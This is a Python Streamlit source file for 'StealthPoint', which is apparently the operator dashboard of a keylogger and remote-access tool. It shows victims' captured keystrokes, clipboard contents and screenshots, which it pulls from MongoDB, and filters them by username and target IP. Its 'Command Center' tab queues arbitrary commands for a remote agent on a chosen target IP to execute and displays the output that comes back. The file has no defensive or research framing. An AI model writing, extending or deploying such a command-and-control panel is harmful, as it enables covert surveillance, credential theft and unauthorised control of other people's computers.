import streamlit as st
import pandas as pd
from pymongo import MongoClient
import plotly.express as px
import time
import os
from streamlit_extras.stylable_container import stylable_container
# --- CONFIGURATION ---
st.set_page_config(page_title="StealthPoint Admin Dashboard", layout="wide")
# Replace this with your actual connection string from MongoDB Atlas
MONGO_URI = os.getenv("MONGO_URI")
# try:
#     MONGO_URI = st.secrets["MONGO_URI"]
# except KeyError:
#     st.error("MONGO_URI not found in Secrets! Please add it to the Streamlit Cloud dashboard.")
#     st.stop()
@st.cache_resource
def get_connect():
    client = MongoClient(MONGO_URI)
    return client["Stealthpoint_DB"]

db = get_connect()
collection = db["logs"]
cmds_col = db["commands"]
screenshot = db["screenshots"]
outputs = db["output"]
tab1 , tab2 = st.tabs(["Dashboard", "Command Center"])

# --- SIDEBAR FILTERS ---
st.sidebar.title("🔍 Search Filters")
user_search = st.sidebar.text_input("Search by Username")
ip_search = st.sidebar.text_input("Search by IP Address")

# --- MAIN DASHBOARD ---
with tab1:
    st.title("🛡️ StealthPoint: Monitoring Dashboard")
    st.markdown("---")
    @st.fragment
    def fetch_data():
        data = list(collection.find().sort("_id", -1)) # Latest logs first
        if data:
            df = pd.DataFrame(data)
                
                # Cleaning data for display
            if '_id' in df.columns:
                df['_id'] = df['_id'].astype(str)
                # Apply Filters
                if user_search:
                    df = df[df['username'].str.contains(user_search, case=False)]
                if ip_search:
                    df = df[df['ip_address'].str.contains(ip_search)]

                # --- METRICS ---
                col1, col2, col3 = st.columns(3)
                col1.metric("Total Logs", len(df))
                col2.metric("Unique Users", df['username'].nunique())
                col3.metric("Total IPs", df['ip_address'].nunique())
                btn_spacer, btn_col = st.columns([1.5, 0.15])
                with btn_col:
                # Clicking this only reruns THIS function
                    st.button("Refresh Logs", use_container_width=True)
                # --- LOG TABLE ---
                st.subheader("📋 Recent Activity Logs")
                st.dataframe(df[['timestamp', 'username', 'ip_address', 'payload', 'clipboard']], use_container_width=True)
    fetch_data()
    st.subheader("📸 Captured Visuals")

# Pull IPs directly from the screenshots collection to avoid DataFrame KeyErrors
    unique_ips = screenshot.distinct("target_ip")
    if unique_ips:
        selected_user = st.selectbox("View Screenshots for:",unique_ips)
        
        # Query the 'scs' collection for the binary data
        items = list(screenshot.find({"target_ip": selected_user}).sort("_id", -1))

        if items:
            cols = st.columns(4)
            for i, doc in enumerate(items):
                # Ensure the document actually contains the 'screenshot' key
                if "screenshot" in doc:
                    with cols[i % 4]:
                        # Streamlit renders the BSON binary directly from your DB
                        st.image(
                            doc["screenshot"], 
                            caption=f"Time: {doc.get('timestamp', 'N/A')}",
                            use_container_width=True
                        )
        else:
            st.info(f"No screenshots found in MongoDB for {selected_user}.")
    else:
        st.warning("No screenshot data found. Ensure your agent is capturing and syncing.")
with tab2:
    st.title("🎮 Command Center")
    st.markdown("---")
    st.subheader("⚠️ Danger Zone")
    target_user = st.text_input("Target IP To Delete Logs")
    if st.button("🗑️ Clear All Keystroke Logs"):
        result = db["logs"].delete_many({"ip": target_user})
        st.success(f"Deleted {result.deleted_count} log entries.")
    st.markdown("---")
    st.subheader("⚠️ Command Execution")
    target_ip = st.text_input("Target IP Address")
    give_command = st.text_input("Command to Execute").lower()
    if st.button(" Send Command"):
        if target_ip and give_command:
        # Create the command document for the agent to find
            command_payload = {
                "target_ip": target_ip,
                "command": give_command,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            cmds_col.insert_one(command_payload)
            st.success(f"Command '{give_command}' sent to {target_ip}")
        else:
            st.warning("IP/Command Not Provided.")
    st.markdown("---")
    @st.fragment
    def fetchoutput():
        st.subheader("📋 Recent Activity Logs")
        data = list(outputs.find().sort("_id", -1))
        if data:
            df = pd.DataFrame(data)
            if '_id' in df.columns:
                df['_id'] = df['_id'].astype(str)
            col1, col2, col3 = st.columns(3)
            col1.metric("Total Logs", len(df))
            col2.metric("Unique Users", df['username'].nunique())
            col3.metric("Total IPs", df['ip_address'].nunique())
            st.markdown("---")
            btn_spacer, btn_col = st.columns([1, 0.15])
            with btn_col:
                st.button("Refresh Output", use_container_width=True)
            st.dataframe(df[['timestamp', 'username', 'ip_address', 'response']], use_container_width=True)
    fetchoutput()